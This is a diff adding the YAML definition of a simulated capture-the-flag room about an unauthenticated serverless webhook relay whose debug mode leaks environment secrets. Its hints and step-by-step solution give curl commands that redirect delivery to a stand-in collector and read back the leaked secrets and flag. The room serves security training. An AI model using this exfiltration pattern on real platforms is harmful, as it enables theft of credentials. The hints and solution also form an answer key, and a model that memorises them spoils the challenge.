@@ -1,0 +1,106 @@
+apiVersion: openrange.io/v1
+kind: Room
+metadata:
+  slug: function-junction
+  title: 'Function Junction'
+  version: 1.0.0
+  difficulty: medium
+  points: 225
+  estimated_minutes: 40
+  tags: [cloud-concepts, serverless-sim, debug-exposure, exfiltration, simulation]
+spec:
+  track: defense-cloud
+  type: challenge
+  summary: >-
+    Serverless functions inherit the worst of both worlds when their
+    event sources skip authentication and their runtimes keep debug
+    switches enabled. This simulated function platform hosts a webhook
+    relay whose HTTP event source requires no signature and whose
+    documented debug mode attaches process environment secrets to every
+    delivery. Aim its caller-chosen destination at your own collector,
+    flip the debug hook, and catch the secrets on the way out.
+  objectives:
+    - 'Identify which function carries an unauthenticated trigger and a documented debug mode.'
+    - 'Invoke it with a crafted payload that redirects delivery to your collector endpoint.'
+    - 'Recover the environment secrets from the captured delivery and submit the flag hidden inside.'
+  prerequisites: []
+  scope:
+    allowed_targets:
+      - 'http://target:8000'
+    forbidden: [control-plane, other-labs, internet, host]
+  safety:
+    simulated_only: true
+    no_real_malware: true
+    reviewer_notes: >-
+      One Flask process simulating the platform and the learner's sink;
+      deliveries are local urllib posts inside the same container. The
+      secrets blob is fabricated training data wrapped around the
+      per-session flag. No cloud SDK and no egress.
+  target:
+    privilege_profile: locked
+    build_context: ./target
+    ports: [8000]
+    healthcheck:
+      http_path: /healthz
+    flag_delivery: env
+    flag_env: ROOM_FLAG
+  workstation: terminal
+  tasks:
+    - id: debug-exfil-secrets
+      title: 'Catch the debug exfiltration in your collector'
+      prompt: >-
+        The junction functions console at http://target:8000 runs two
+        functions. One refuses unsigned invokes; the other, webhook-relay,
+        accepts any HTTP event and forwards JSON to a destination_url of
+        the caller's choosing, with a documented debug mode that attaches
+        a process environment summary to each delivery. Because the lab
+        network has no internet, the console provides /sink as your own
+        collector. Point an invoke at it with the debug hook enabled,
+        read what arrives, and submit the FLAG value buried in the
+        SECRETS_BLOB the function leaked.
+      points: 225
+      hints:
+        - cost: 0
+          text: >-
+            GET /functions lists both functions with their trigger auth.
+            The one marked auth none is your target; GET /functions/
+            webhook-relay documents exactly how its debug mode activates.
+        - cost: 10
+          text: >-
+            POST /functions/webhook-relay/invoke with JSON body
+            {"destination_url": "http://target:8000/sink",
+            "payload": {"hello": 1}, "debug_hook": true}. A 200 with
+            status delivered means the collector already has it.
+        - cost: 25
+          text: >-
+            GET /sink/events returns every collected delivery as JSON.
+            Look inside events[0].diagnostics.environment.SECRETS_BLOB:
+            the signing key slot holds FLAG{...}. Submit that value.
+      solution: |
+        1. Survey the platform:
+           curl http://target:8000/functions
+           thumbnailer declares storage-event(signed); webhook-relay
+           declares http-event(none), which is the misconfiguration this
+           room is about.
+        2. Read the function detail:
+           curl http://target:8000/functions/webhook-relay
+           It documents debug_mode with how: invoke using
+           {"debug_hook": true} and effect: diagnostics attach the
+           process environment summary to the delivery body.
+        3. Prepare your collector. The console page explains that /sink
+           stands in for your internet webhook receiver because the lab
+           network cannot route out. Nothing needs starting; it exists.
+        4. Trigger the abuse:
+           curl -X POST http://target:8000/functions/webhook-relay/invoke \
+                -H 'Content-Type: application/json' \
+                -d '{"destination_url":"http://target:8000/sink","payload":{"note":"x"},"debug_hook":true}'
+           The handler builds a delivery containing diagnostics with the
+           SECRETS_BLOB value, then POSTs it to your sink URL.
+        5. Collect the goods:
+           curl http://target:8000/sink/events
+           events[0].diagnostics.environment.SECRETS_BLOB reads like a
+           semicolon-joined secret dump; one slot carries FLAG{...}.
+        6. Submit that flag value. On a real platform the identical move
+           costs a breach notification; here it only costs curiosity.
+      validator:
+        type: per_session_flag
